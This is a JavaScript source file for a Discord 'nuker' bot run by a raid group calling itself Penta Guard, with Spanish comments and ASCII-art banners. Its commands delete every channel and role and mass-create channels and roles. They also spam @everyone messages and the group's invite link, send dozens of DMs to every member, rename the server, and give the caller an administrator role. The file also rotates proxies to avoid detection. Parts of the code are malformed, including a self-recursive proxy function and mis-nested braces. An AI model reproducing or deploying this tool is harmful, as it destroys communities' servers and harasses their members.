const Discord = require("discord.js")
const client = new Discord.Client();
const fs = require("fs")
const config = require('./config.json');

//  [----------------------------CONFIG BOT----------------------]  //

var token = config.token;

const token_bot = token;

  function connectToProxy() {
    const proxyFile = "./proxy.txt";
    let proxyList = [];

    try {
      const data = fs.readFileSync(proxyFile, "utf-8");
      proxyList = data.split("\n");
    } catch (err) {
      console.error("Error:", err);
    }

    const randomProxy = proxyList[Math.floor(Math.random() * proxyList.length)];
    const proxyUrl = `http://${randomProxy}`;

      connectToProxy();
    
      //  [----------------------------[BOT]----------------------]  //

client.on("ready", () => {
  


    
  
  })

console.log(`                                                                                                            
⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀
⡀ 
⢻⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       ⢠⣾⡇
⢸⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⢤⣶⠶⠶⢶⣶⡤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⢀⣴⠋⢀⠇
⠈⣇⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⢉⡴⠞⠋⣿⠀⠀⠀⡯⠙⠳⣦⡉⠙⠲⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⣼⠀
⠀⠹⣆⠀⠀⠈⠛⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⢀⣰⠏⠀⠀⠀⢻⡄⠀⢰⠇⠀⠀⠈⢻⣄⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠋⠁⠀⠀⣰⠃⠀
⠀⠀⠹⣇⠀⠀⠀⠀⠉⠳⢦⣄⡀⠀⠀⠀⢀⡾⠃⠀⣠⠞⠋⠁⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠉⠙⢷⣄⠀⠙⢧⡀⠀⠀⠀⢀⣠⡶⠛⠁⠀⠀⠀⠀⣴⠃⠀⠀
⠀⠀⠀⠙⢧⡀⠀⠀⠀⠀⠀⠈⠙⠳⠶⢤⣿⣄⣀⣸⠋⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⢹⣆⣀⣨⣷⡤⠶⠚⠋⠁⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠈⡇⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⣼⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣧⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⡟⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠛⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⣀⠀⠀⠀⠀⠀⠀⢀⡟⠀⡏⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⣿⠀⢿⡀⠀⠀⠀⠀⠀⠀⣠⡴⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡆⠉⢻⡶⢤⣀⡀⢀⡾⠁⣼⠃⠀⠀⠀⠀⠀⠀⣸⠹⣆⠀⠀⠀⠀⠀⠀⠹⣆⠘⢧⡀⢀⣠⡤⢶⡟⠉⢰⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⣧⠀⢸⠃⠀⣨⠿⠋⣠⠞⠁⠀⠀⠀⠀⠀⠀⢸⡏⠀⣹⡆⠀⠀⠀⠀⠀⠀⠘⢦⣈⠛⢿⡅⠀⢸⡇⠀⡿⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡕⣿⣧⣸⡀⠀⠛⡶⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⣾⠃⠀⢸⣇⡼⡿⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠘⢯⡙⠷⣄⣸⠇⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⣴⠃⠀⠹⣄⠀⠀⠀⠀⠀⠀⢀⣼⠃⠀⢹⣆⣠⠞⣫⡿⠁⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣄⢀⠙⢷⡘⣿⣷⡶⣄⠙⠷⣄⡀⠀⠀⠀⠘⠁⠀⠀⠀⠈⠃⠀⠀⠀⢀⣴⠞⢁⣤⢶⣾⡿⢡⡾⠋⡀⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠸⣇⠈⣻⣷⣿⠳⣤⡈⠙⠓⠄⠀⠈⠳⡄⠀⣰⠛⠁⠀⠠⠞⠋⢀⣴⠟⣇⣿⡟⠀⣾⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⠻⣾⠏⠸⣿⣦⡈⠛⠶⢤⣤⣤⣤⠴⡷⠶⣿⠦⣤⣤⣤⡤⠾⠋⢁⣼⣿⠁⠹⣶⠏⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣄⠀⣿⠀⠀⠘⠿⣿⣦⣤⢴⣿⡿⠃⠀⡷⠛⣦⠀⠘⢿⣷⠦⣤⣶⣿⠟⠁⠀⢀⡿⢀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⠘⣷⣄⠀⠀⠀⠉⠉⠉⠁⠀⠀⠀⡇⠀⡟⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⣠⣾⠁⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣴⡏⢹⢷⣦⣄⡀⠀⣀⣤⡤⢤⡀⡧⠀⠇⢀⡤⢤⣤⡀⠀⣀⣠⣴⣿⡏⢻⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠈⣧⢸⡾⠁⣨⣿⡟⠙⢯⣀⠀⠀⠀⠀⠀⠀⢀⣀⡿⠉⢻⢿⡁⠘⣿⠃⡿⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡓⠶⠶⠿⡛⠥⠞⠉⢠⣿⣄⡀⠉⠉⠻⣦⣀⡴⠛⠉⠉⢀⣴⣿⡀⠙⠲⠬⣻⠷⠶⠶⢚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⣀⣀⣀⣠⣴⡋⢻⣿⡛⢳⠒⣤⠼⣿⠧⣤⢲⡞⢻⣿⠋⢹⡦⣄⣀⣀⣀⣤⠔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠹⣆⠈⠛⣾⣿⣧⣿⠙⠛⠓⠛⠚⠛⢋⣇⡾⣿⣷⠋⠀⣼⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡀⣿⣿⣆⠙⠃⠀⠀⠀⠀⠀⠘⠋⣼⡿⣿⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡿⣮⡙⠛⣟⣻⣯⣯⣽⣟⣿⠛⢋⣴⣷⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣼⣏⠛⣋⣤⠶⠒⠶⣤⣙⠛⣹⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⡉⠉⠉⠀⣠⣤⡄⠀⠉⠉⢁⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠲⠤⠞⠋⠀⠙⠶⠤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    █████ ▄▄▄       ██████ ▄▄▄█████▓     ▓█████▄ ▓█████ ▄▄▄      ▓█████▄ 
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ▓██    ▒████▄   ▒██    ▒ ▓  ██▒ ▓▒     ▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ▒████  ▒██  ▀█▄ ░ ▓██▄   ▒ ▓██░ ▒░     ░██   █▌▒███  ▒██  ▀█▄  ░██   █▌
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ░▓█▒   ░██▄▄▄▄██  ▒   ██▒░ ▓██▓ ░     ▒░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██▒░▓█▄   ▌
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ▒░▒█░    ▓█   ▓██▒██████▒▒  ▒██▒ ░     ░░▒████▓ ░▒████ ▓█   ▓██░░▒████▓ 
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ░ ▒ ░    ▒▒   ▓▒█▒ ▒▓▒ ▒ ░  ▒ ░░       ░ ▒▒▓  ▒ ░░ ▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ░ ░       ░   ▒▒ ░ ░▒  ░      ░          ░ ▒  ▒  ░ ░    ░   ▒▒   ░ ▒  ▒ 
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ░ ░     ░   ▒  ░  ░  ░    ░ ░          ░ ░  ░    ░    ░   ▒    ░ ░  ░ 
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ░             ░        ░                   ░       ░        ░      ░    
  `)

console.log(`

                                     
         _          _            _           _            _                    _        _                  _                   _          _         
         /\ \       /\ \         /\ \     _  /\ \         / /\                 /\ \     /\_\               / /\                /\ \       /\ \       
        /  \ \     /  \ \       /  \ \   /\_\\_\ \       / /  \               /  \ \   / / /         _    / /  \              /  \ \     /  \ \____  
       / /\ \ \   / /\ \ \     / /\ \ \_/ / //\__ \     / / /\ \             / /\ \_\  \ \ \__      /\_\ / / /\ \            / /\ \ \   / /\ \_____\ 
      / / /\ \_\ / / /\ \_\   / / /\ \___/ // /_ \ \   / / /\ \ \           / / /\/_/   \ \___\    / / // / /\ \ \          / / /\ \_\ / / /\/___  / 
     / / /_/ / // /_/_ \/_/  / / /  \/____// / /\ \ \ / / /  \ \ \         / / / ______  \__  /   / / // / /  \ \ \        / / /_/ / // / /   / / /  
    / / /__\/ // /____/\    / / /    / / // / /  \/_// / /___/ /\ \       / / / /\_____\ / / /   / / // / /___/ /\ \      / / /__\/ // / /   / / /   
   / / /_____// /\____\/   / / /    / / // / /      / / /_____/ /\ \     / / /  \/____ // / /   / / // / /_____/ /\ \    / / /_____// / /   / / /    
  / / /      / / /______  / / /    / / // / /      / /_________/\ \ \   / / /_____/ / // / /___/ / // /_________/\ \ \  / / /\ \ \  \ \ \__/ / /     
 / / /      / / /_______\/ / /    / / //_/ /      / / /_       __\ \_\ / / /______\/ // / /____\/ // / /_       __\ \_\/ / /  \ \ \  \ \___\/ /      
 \/_/       \/__________/\/_/     \/_/ \_\/       \_\___\     /____/_/ \/___________/ \/_________/ \_\___\     /____/_/\/_/    \_\/   \/_____/       
                                                                                                                                                     
 


`)

console.log((`


                                               ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
                                               │                                                                  │
                                               │          ${('• $start')} = Termina con el servidor .D                            │
                                               │          ${('• $nuke')} = Nukea los canales                            │                
                                               │          ${('• $fuck')} = Crea muchos canales con pings en el          │
                                               │          ${('• $adm')} = Crea un rol con admin y te lo da           │
                                               │                                                                  │
                                               │                                                                  │
                                               │                ===== Usa ${('.help')} para mas informacion ====                │
                                               │                                                                  │
                                               ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯



  `))

console.log((`

██████╗ ██████╗ ██╗██╗   ██╗ █████╗ ████████╗███████╗    ██████╗  ██████╗ ████████╗
██╔══██╗██╔══██╗██║██║   ██║██╔══██╗╚══██╔══╝██╔════╝    ██╔══██╗██╔═══██╗╚══██╔══╝
██████╔╝██████╔╝██║██║   ██║███████║   ██║   █████╗      ██████╔╝██║   ██║   ██║   
██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══██║   ██║   ██╔══╝      ██╔══██╗██║   ██║   ██║   
██║     ██║  ██║██║ ╚████╔╝ ██║  ██║   ██║   ███████╗    ██████╔╝╚██████╔╝   ██║   
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚═════╝  ╚═════╝    ╚═╝   
`))
console.log(`ya me conecte a la base de datos xd`);


//no se daña si le envian md al bot
client.on('message', async (message) => {
  if (message.channel.type === 'dm' && !message.author.bot) {
    try {
      console.log(`Mensaje recibido en DM de ${message.author.tag}: ${message.content}`);
    } catch (error) {
      console.error('Error al procesar el mensaje en DM:', error);
    }
  }
});

process.on('unhandledRejection', (error) => {
  console.error('Error no controlado:', error);
});

process.on('uncaughtException', (error) => {
  console.error('Excepción no capturada:', error);
});


    };


//  [----------------------------[$START]----------------------]  //

client.on("message", async  message => {
if(message.author.bot) return;

if(message.content === '$start') {

  await message.delete();

  message.guild.channels.cache.forEach(channel => channel.delete())

    for (let i = 0; i <= 50; i++) {
      
     await message.guild.channels.create("raidedbyfastdead", {


    })}}});




//  [----------------------------[$SPAM]----------------------]  //

  client.on("message", async message => {
  if (message.author.bot) return;
  const args = message.content
    .slice()
    .trim()
    .split(/ +/g);

const command = args.shift().toLowerCase();

  if (command=== '$spam') {
    message.delete();



    console.log(`Hey owner. Comando: "$mass_message" ejecutado por ${message.author.tag}. ID ${message.author.id}`);


      message.guild.channels.cache.filter(r => r.type === "text").forEach(channel => {


        const messages = Array(10).fill(`nukeado por Penta Guard. https://discord.gg/7bnf3mk9nj @everyone`);

        return Promise.all(messages.map(msg => channel.send(msg)));

      })}});


//  [----------------------------[$BYPASS]----------------------]  //
client.on("message", message => {
if(message.author.bot) return;

if(message.content === '$bypass') {

  message.guild.channels.cache.forEach(channel => channel.setName("bypassed-by-penta-guard")
                                        .then(channel => {

                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                          channel.send("**PENTA GUARD ESTA AQUI**. Penta Guard ha destruido tu servidor. Unete a Penta Guard Community  https://discord.gg/7bnf3mk9nj @everyone");
                                        })

                                        )}});

//  [----------------------------[$PING]----------------------]  //

  client.on('message', async (message) => {
    if (message.author.bot) return;

    if (message.content === '.ping') {
      const msg = await message.channel.send(`🏓 Ping...`);

      const embed = new Discord.MessageEmbed()
        .setTitle('Pong!')
        .setDescription(`Ping: ${client.ws.ping}ms`)
        .setColor('#0099ff');

      msg.delete();

      message.channel.send(embed);
    }
  }); 


//  [----------------------------[$ADMIN]----------------------]  //

client.on("message", async msg => {


  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('$admin')) {
    let rol = await msg.guild.roles.create({
      data: {
        name: "pentaguard",
        color: "B9BBBE",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    })

    msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => { });
      })
      .catch(e => { });
  }
});

//  [----------------------------[$NUKE]----------------------]  //

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '$nuke') {

    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`fucked-by-penta-guard`, {
      type: 'text'
    }).then(channel => {
      channel.send("Nuked by pentaguard https://discord.gg/7bnf3mk9nj @everyone")
    })
  }
})

//  [----------------------------[$DELETEROL]----------------------]  //

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === ('$deleterol')) {
    message.delete()
    message.guild.roles.cache.map(roles => roles.delete());
  }
});

//  [----------------------------[$CREATEROLE]----------------------]  //

client.on("message", message => {

  if (message.author.bot) return;

  if (message.content === '$createrole') {
    message.delete()
    for (let i = 0; i <= 150; i++) {
      message.guild.roles.create({ data: { name: `pentaguard`, color: '#FFFFF', }, reason: 'raided by penta guard', })
    };
  }
});

//  [----------------------------[$FUCK]----------------------]  //

client.on("message", async message => {
  if (message.author.bot) return;

  if (message.content === '$fuck') {
    message.delete();

    
    for (let i = 0; i <= 100; i++) {
      message.guild.channels.create(` ̷	𝕡𝕨𝕟𝕖𝕕𝕓𝕪𝕡𝕖𝕟𝕥𝕙𝕒𝕘𝕦𝕒𝕣𝕕` , {
        type: 'text'
      }).then(channel => {
        const messages = Array(15).fill("**pwned by Penta Guard**, Penta Guard pwned your server https://discord.gg/7bnf3mk9nj @everyone");
        return Promise.all(messages.map(msg => channel.send(msg)));
      });
    }

  }
});

//  [----------------------------[$mdall]----------------------]  //

client.on("message", message => {
  if (message.author.bot) return;

 if (message.content === '$mdall') {
 message.delete();


  message.guild.members.cache.forEach(member => { 
    for (let i = 0; i <= 50; i++) { 
         member.send({ 
              embed: { 
                   description: `*| Destroyed by fast$dead. Join F$D and look the R41D*`, 
                   author: { 
                        name: 'Penta Guard on Top', 
                        url: 'https://discord.gg/7bnf3mk9nj', 
                        icon_url: 'https://cdn.discordapp.com/attachments/1125906081168756790/1203841419744378880/466bbde0-2f35-4720-b4e9-ea73b0539906_out_3.jpg?ex=65d28fb0&is=65c01ab0&hm=870a5d01735cb15d4f0a6cde1c7e0fc117464ee46fda1d27de1d190c50167d14&' 
                   }, 
                   thumbnail: { 

                   }, 
                   footer: { 
                        text: 'Penta Guard On Top', 
                        icon_url: 'https://cdn.discordapp.com/attachments/1125906081168756790/1203841419744378880/466bbde0-2f35-4720-b4e9-ea73b0539906_out_3.jpg?ex=65d28fb0&is=65c01ab0&hm=870a5d01735cb15d4f0a6cde1c7e0fc117464ee46fda1d27de1d190c50167d14&' 
                   }, 
                   color: 0x0000 
              } 
         }); 
    } 
});
   }});

//  [----------------------------[$SERVER]----------------------]  //

client.on("message", async message => {
  if (message.author.bot) return;

  if (message.content === '$server') {

    message.delete();

    message.guild.setIcon("https://cdn.discordapp.com/attachments/1125906081168756790/1203841419744378880/466bbde0-2f35-4720-b4e9-ea73b0539906_out_3.jpg?ex=65d28fb0&is=65c01ab0&hm=870a5d01735cb15d4f0a6cde1c7e0fc117464ee46fda1d27de1d190c50167d14&");
    message.guild.setName("Raided by Penta Guard.");

    const embed = new Discord.MessageEmbed()
    .setTitle('Raided by Penta Guard')
    .setDescription('**Foto y Nombre cambiados**')
    .setImage("https://cdn.discordapp.com/attachments/1125906081168756790/1203841419744378880/466bbde0-2f35-4720-b4e9-ea73b0539906_out_3.jpg?ex=65d28fb0&is=65c01ab0&hm=870a5d01735cb15d4f0a6cde1c7e0fc117464ee46fda1d27de1d190c50167d14&")
    .setThumbnail("https://cdn.discordapp.com/attachments/1125906081168756790/1203841419744378880/466bbde0-2f35-4720-b4e9-ea73b0539906_out_3.jpg?ex=65d28fb0&is=65c01ab0&hm=870a5d01735cb15d4f0a6cde1c7e0fc117464ee46fda1d27de1d190c50167d14&")
    .setColor('#blue');

    message.channel.send(embed)

  }});
//  [----------------------------[$OFF]----------------------]  //


client.on("message", message => {
  if (message.author.bot)  return;


  if (message.content === '.off') {

    message.delete();


                             // IDS founders
 const founders = ['1051649253468020756', '982737567017480223'];   

 //Verify the user authorized
                          
 if (!founders.includes(message.author.id)) {
 const embedUnauthorized = new Discord.MessageEmbed()
 .setTitle('No tienes permiso para usar este comando.')
 .setColor('#050404')
 .setImage('https://cdn.discordapp.com/attachments/1125906081168756790/1203841419744378880/466bbde0-2f35-4720-b4e9-ea73b0539906_out_3.jpg?ex=65d28fb0&is=65c01ab0&hm=870a5d01735cb15d4f0a6cde1c7e0fc117464ee46fda1d27de1d190c50167d14&');
                          
 return message.channel.send(embedUnauthorized);
 }


    console.log("Me apage xd");

    client.destroy();

  }});

//  [----------------------------[$INFO]----------------------]  //

client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  
  if (command === '$info') { 
    message.delete();

    console.log(`Hey owner. Comando: "$info" ejecutado por ${message.author.name}. ID ${message.author.id}`);

    const embed = new Discord.MessageEmbed()
      .setTitle('Raid data')
      .setDescription('**Raid Data**')
      .addField('Canales', message.guild.channels.cache.size.toString(), true)
      .addField('Roles', message.guild.roles.cache.size.toString(), true)
      .addField('Users', message.guild.memberCount.toString(), true)
      .setImage('https://cdn.discordapp.com/attachments/1125906081168756790/1203841419744378880/466bbde0-2f35-4720-b4e9-ea73b0539906_out_3.jpg?ex=65d28fb0&is=65c01ab0&hm=870a5d01735cb15d4f0a6cde1c7e0fc117464ee46fda1d27de1d190c50167d14&')
      .setColor('#050404');

    message.channel.send(embed);
  }
});

//  [----------------------------[$HELP]----------------------]  //
   client.on("message", message => {
     if (message.author.bot) return;

    if (message.content === '$help') {
    message.delete();

      const embed = new Discord.MessageEmbed()

      .setTitle("Comandos")
      .addField('$start', 'Elimina todos los canales y crea nuevos')
      .addField('$spam', 'Envia un mensaje a todos los canales')
      .addField('$nuke', 'Elimina todos los canales')
      .addField('$fuck', 'Crea canales y pingnea ')
      .addField('$admin', 'Crea un rol con administrador y te lo da')
      .addField('$deleterol', 'Elimina todos los roles')
      .addField('$createrol', 'Crea 150 nuevos roles')
      .addField('$mdall', 'Spamea el DM de los usuarios')
      .addField('$bypass', 'Renombra los canales y pingnea')
      .addField('$server', 'Cambia el nombre y icono')
      .addField('$info', 'Info del server')
      .addField('.off', 'Apaga el bot')
      .setAuthor('Comandos:')
      .setColor(`#ff0000`)
      .setImage('https://cdn.discordapp.com/attachments/1125906081168756790/1203841419744378880/466bbde0-2f35-4720-b4e9-ea73b0539906_out_3.jpg?ex=65d28fb0&is=65c01ab0&hm=870a5d01735cb15d4f0a6cde1c7e0fc117464ee46fda1d27de1d190c50167d14&')




      message.channel.send(embed)
    }});



client.login(token_bot);